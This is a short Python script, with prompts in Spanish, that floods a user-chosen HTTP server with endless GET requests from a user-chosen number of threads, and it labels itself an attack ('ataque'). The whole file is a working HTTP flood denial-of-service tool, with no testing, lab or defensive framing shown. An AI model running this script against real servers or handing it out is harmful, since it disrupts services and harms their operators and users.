import requests
import threading

def attack(url):
    while True:
        try:
            response = requests.get(f"http://{url}")
            print("Status Code: ", response.status_code)
        except Exception as e:
            print(e)

if __name__ == '__main__':
    target_url = input("Introduce la URL del servidor HTTP: ")
    num_threads = int(input("Introduce el número de hilos para realizar el ataque: "))
    
    print("\nIniciando el ataque...\n")
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(target_url,))
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()